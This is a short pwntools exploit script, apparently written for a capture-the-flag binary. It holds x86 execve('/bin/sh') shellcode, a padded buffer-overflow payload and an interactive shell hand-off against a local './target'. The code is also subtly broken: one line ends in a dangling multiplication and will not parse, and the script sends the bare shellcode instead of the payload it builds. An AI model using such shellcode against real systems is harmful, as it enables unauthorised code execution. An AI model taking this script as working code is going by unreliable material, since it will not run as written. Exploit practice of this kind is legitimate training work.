from pwn import *

_argv = []
pay = ''
pay += '\x90'*
p = process(executable = './target',argv=_argv)
### Gadget
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'


### Exploit
pay = b''
pay += b'a'*12
pay += b'b'*4
pay += b'c'*4
pay += shellcode
p.send(shellcode)

p.interactive()
